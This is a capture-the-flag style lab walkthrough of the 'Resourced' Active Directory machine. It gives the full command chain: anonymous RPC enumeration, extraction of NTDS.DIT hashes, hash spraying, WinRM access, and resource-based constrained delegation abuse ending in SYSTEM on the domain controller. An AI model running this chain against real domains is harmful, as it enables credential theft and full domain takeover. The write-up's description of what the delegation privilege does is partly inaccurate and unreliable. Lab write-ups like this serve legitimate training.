# Resourced
## AD, rpcclient, NTDS.DIT, SYSTEM, secretsdump.py, NetExec, evil-winrm, RBCD
```
The initial access strategy involved utilizing an RPC (Remote Procedure Call) Client.
Subsequently, a old Password Audit was found on a shared network resource to obtain the NTLM hash of a privileged user.
Finally, delegation privileges were leveraged to acquire the highest level of privileges on the ‘Resourcedc’ domain controller.
```
## nmap
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-05 15:40:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
## /etc/hosts/
```
Hosts have been found add them to your /etc/hosts file:
192.168.239.175 resourced.local
192.168.239.175 resourcedc.resourced.local
```
## rpcclient username enumeration
```
Using RPC client I  was able to login as anonymous:

rpcclient -U "" -N resourced.local     
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin                        <-- SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: <REDACTED>

srvinfo returned nothing but querydispinfo returned list of users and found some reminder, possible password of v.ventz user.
I tried to use this password for xfreerdp, evil-winrm. I was able to list shares using smb.
```
## SMB, NTDS.DIT, SYSTEM, secretsdump.py
```
In the Password Audit Share, I found two directories, Active Directory and Registry.
Inside the directories, I found the NTDS.DIT and SYSTEM files, which are used for password auditing.
Use secretsdump.py from Impacket to extract NTLM hashes from the downloaded system and ntds.dit file.
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```
## NetExec, evil-winrm access                                                                  
```
Create your users.txt and hashes.txt and spray with NetExec:
netexec winrm <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
I was able to find a working hash for user L. Livingstone, who is SysAdmin.
evil-winrm in to the system.

evil-winrm -u L.Livingstone -H "<REDACTED>" -i 192.168.229.175
```
## SharpHound, Bloodhound
```
Upload with evil-winrm's upload function. 
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public

Extract your json objects for bloodhound and upload them.
```
##  Resource-Based Constrained Delegation
```
L.Livingstone is a SYS ADMIN and possesses the Resource-Based Constrained Delegation Privilege.
This privilege allows L.Livingstone to create a new account on the DC.
Resource-Based Constrained Delegation is a powerful privilege that enables the delegation of user credentials to specific resources, allowing for seamless authentication and access to those resources.
With this privilege, L.Livingstone can effectively manage and control user accounts, granting or revoking access as needed.
```
## addcomputer.py
```
addcomputer.py resourced.local/l.livingstone -dc-ip 192.168.239.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'mute' -computer-pass 'wintermute'
Successfully added machine account mute with password wintermute
```
## rbcd.py
```
This enables mute to retrieve service tickets for resourcedc using getST.py
rbcd.py -action write -delegate-to "RESOURCEDC$" -delegate-from "mute" -dc-ip 192.168.239.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
```
## getST.py
```
Now I will obtain service tickets for RESOURCEDC using getST.py
getST.py -spn cifs/resourcedc.resourced.local -impersonate Administrator resourced/mute\\$:'wintermute' -dc-ip 192.168.239.175 

Service ticket saved to our working directory as Administrator.ccache
Add to our kerberos cache file:
export KRB5CCNAME=$PWD/Administrator.ccache

If I check now using klist I can see the ticket cache file.
```

## klist
```
Ticket cache: FILE:/home/kali/offsec/resourced/Administrator.ccache
Default principal: Administrator@resourced

Valid starting       Expires              Service principal
01/07/2024 08:42:23  01/07/2024 18:42:22  cifs/resourcedc.resourced.local@RESOURCED.LOCAL
        renew until 01/08/2024 08:42:22
```
## PSexec
```
Now using PSEXEC and the service ticket I got access to RESOURCEDC as NT AUTHORITY\SYSTEM.
psexec.py -dc-ip 192.168.239.175 -k -no-pass resourcedc.resourced.local
```




